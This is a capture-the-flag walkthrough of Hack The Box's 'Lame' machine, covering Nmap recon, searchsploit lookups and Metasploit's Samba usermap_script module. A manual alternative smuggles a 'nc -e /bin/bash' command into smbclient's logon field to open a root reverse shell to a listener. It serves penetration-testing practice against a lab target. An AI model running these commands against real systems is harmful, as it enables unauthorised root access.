---
title: "Walk-through of Lame from HTB"
toc: true
toc_sticky: true
excerpt_separator:  <!--more-->
categories:
  - CTF
tags:
  - HTB
  - CTF
  - smbclient
  - Metasploit
  - Linux
---

## Machine Information

![Lame](/images/2020-04-05-21-43-26.png)

This was the first machine released on the [Hack The Box](https://www.hackthebox.eu/home) platform. It's now retired so only available to those with VIP membership here: [HTB - 001 - Easy - Lame](https://www.hackthebox.eu/home/machines/profile/1)
<!--more-->

### Initial Recon

Check for open ports with Nmap:

```text
root@kali:~/htb/lame# nmap -sS -sC -sV -oA lame -p- -T4 10.10.10.3

Starting Nmap 7.70 ( https://nmap.org ) at 2019-07-16 22:10 BST
Nmap scan report for 10.10.10.3
Host is up (0.037s latency).
Not shown: 65530 filtered ports
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.14
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup:WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup:WORKGROUP)
3632/tcp open  distccd     distccd v1((GNU)4.2.4(Ubuntu 4.2.4-1ubuntu4))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
Host script results:
|_clock-skew: mean: -2d23h00m43s, deviation: 0s, median: -2d23h00m43s
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   NetBIOS computer name: 
|   Workgroup: WORKGROUP\x00
|_  System time: 2019-07-13T14:11:05-04:00
|_smb2-time: Protocol negotiation failed (SMB2)
```

Lots of ports open. Has port 21 open with anonymous FTP, but looking around there is nothing obvious.

### Gaining Access

Box is running vsftpd 2.3.4 so check searchsploit for vulnerability:

```text
root@kali:~/htb/lame# searchsploit vsftpd
---------------------------------------------------------------------------------
vsftpd 2.0.5 - 'CWD' (Authenticated) Remote Memory Consumption | exploits/linux/dos/5814.pl
vsftpd 2.0.5 - 'deny_file' Option Remote Denial of Service(1)  | exploits/windows/dos/31818.sh
vsftpd 2.0.5 - 'deny_file' Option Remote Denial of Service(2)  | exploits/windows/dos/31819.pl
vsftpd 2.3.2 - Denial of Service                               | exploits/linux/dos/16270.c
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)         | exploits/unix/remote/17491.rb
---------------------------------------------------------------------------------
```

Last one in above list for backdoor execution looks good. Start Metasploit and load exploit:

```text
root@kali:~/htb/lame# msfconsole
msf5 > search vsftpd 2.3.4
msf5 > use exploit/unix/ftp/vsftpd_234_backdoor
msf5 > show options
msf5 > set RHOST 10.10.10.3
msf5 > exploit
```

No luck, go back to list of services, now try samba on port 445:

```text
root@kali:~/htb/lame# searchsploit samba 3.0.20
---------------------------------------------------------------------------------
Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit) | exploits/unix/remote/16320.rb
Samba < 3.0.20 - Remote Heap Overflow                                            | exploits/linux/remote/7701.txt
---------------------------------------------------------------------------------
```

Remote heap overflow sounds promising, go back in to Metasploit and try it:

```text
root@kali:~/htb/lame# msfconsole
msf5 > search samba 3.0.20
msf5 > use exploit/multi/samba/usermap_script
msf5 > set RHOST 10.10.10.3
msf5 > exploit

[*] Started reverse TCP double handler on 10.10.14.14:4444 
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo NKYmctrocnnm8nuo;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "NKYmctrocnnm8nuo\r\n"
[*] Matching...
[*] A is input...
[*] Command shell session 1 opened (10.10.14.14:4444 -> 10.10.10.3:35080) at 2019-07-16 22:18:10 +0100
```

This works and I now have a reverse shell on to the box.

### User and Root Flags

I have a shell, but need an interactive one to make progress:

```text
msf5 > shell
[*] Trying to find binary(python) on target machine
[*] Found python at /usr/bin/python
[*] Using `python` to pop up an interactive shell
```

Now have interactive shell so get the user flag:

```text
# ls /home
ftp  makis  service  user

# ls /home/makis
user.txt

# cat /home/makis/user.txt
# cat /root/root.txt
```

## Alternative Method (without MetaSploit)

Start a Netcat session listening on my Kali machine:

```text
root@kali:~/htb/lame# nc –lvp 4444
```

Switch to another terminal and use smbclient to connect:

```text
root@kali:~/htb/lame# smbclient //10.10.10.3/tmp
Enter WORKGROUP\root's password:        <--- just press enter
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> logon "./=`nohup nc 10.10.14.22 4444 –e /bin/bash`"
Password:                               <--- just press enter
```

Switch back to Netcat terminal and should have root shell:

```text
# id
uid=0(root) gid=0(root)
```

Can get flags as above now.
